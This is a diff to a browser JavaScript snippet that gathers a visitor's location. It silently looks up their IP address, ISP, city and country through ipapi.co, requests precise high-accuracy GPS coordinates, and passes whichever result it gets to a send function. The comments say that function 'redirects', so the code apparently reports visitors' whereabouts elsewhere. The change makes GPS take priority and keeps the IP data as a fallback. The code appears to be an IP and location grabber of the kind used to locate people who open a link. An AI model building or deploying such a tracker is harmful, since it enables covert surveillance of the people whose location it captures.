@@ -20,6 +20,11 @@
   var IP_API  = "https://ipapi.co/json/";
   var done    = false;
 
+  // Stored IP result — used ONLY if GPS is denied or fails
+  var ipBackup = null;
+  // Whether GPS has already given us a definitive answer (success OR denied)
+  var gpsSettled = false;
+
   function send(payload) {
     if (done) return;
     done = true;
@@ -34,32 +39,44 @@
     );
   }
 
-  // Fire IP lookup immediately (parallel with GPS prompt)
+  // ── IP fetch — runs in parallel but ONLY redirects if GPS is denied/failed ─
   fetch(IP_API)
     .then(function (r) { return r.json(); })
     .then(function (d) {
-      if (!done && typeof d.latitude === "number") {
-        send({
-          source:  "IP",
-          lat:     +d.latitude.toFixed(6),
-          lng:     +d.longitude.toFixed(6),
-          city:    d.city,
-          region:  d.region,
-          country: d.country_name,
-          isp:     d.org,
-          ip:      d.ip
-        });
-      }
+      if (typeof d.latitude !== "number") return;
+
+      // Store as backup
+      ipBackup = {
+        source:  "IP",
+        lat:     +d.latitude.toFixed(6),
+        lng:     +d.longitude.toFixed(6),
+        city:    d.city,
+        region:  d.region,
+        country: d.country_name,
+        isp:     d.org,
+        ip:      d.ip
+      };
+
+      // Only redirect now if GPS already settled with a failure
+      if (gpsSettled && !done) send(ipBackup);
     })
     .catch(function () {
-      if (!done) send({ source: "ERROR", lat: 0, lng: 0 });
+      if (gpsSettled && !done) send({ source: "ERROR", lat: 0, lng: 0 });
     });
 
-  // Ask for GPS (shows native browser permission popup)
-  if (!navigator.geolocation) return;
+  // ── GPS — precise location, always wins over IP ────────────────────────────
+  if (!navigator.geolocation) {
+    // No GPS support at all — use IP immediately
+    gpsSettled = true;
+    if (ipBackup) send(ipBackup);
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
+
+    // ✅ GPS allowed — send precise coordinates immediately
     function (pos) {
+      gpsSettled = true;
       send({
         source:   "GPS",
         lat:      +pos.coords.latitude.toFixed(6),
@@ -67,8 +84,25 @@
         accuracy: Math.round(pos.coords.accuracy)
       });
     },
-    function () { /* denied — IP fetch already running */ },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+
+    // ❌ GPS denied or failed — fall back to IP
+    function () {
+      gpsSettled = true;
+      if (done) return;
+
+      if (ipBackup) {
+        // IP result already arrived — use it now
+        send(ipBackup);
+      }
+      // else: IP fetch is still in flight — its .then() will call send()
+      // because gpsSettled is now true
+    },
+
+    {
+      enableHighAccuracy: true,  // real GPS chip, not cell towers
+      timeout:            10000, // wait up to 10s for GPS lock
+      maximumAge:         0      // never use cached position
+    }
   );
 
 })();
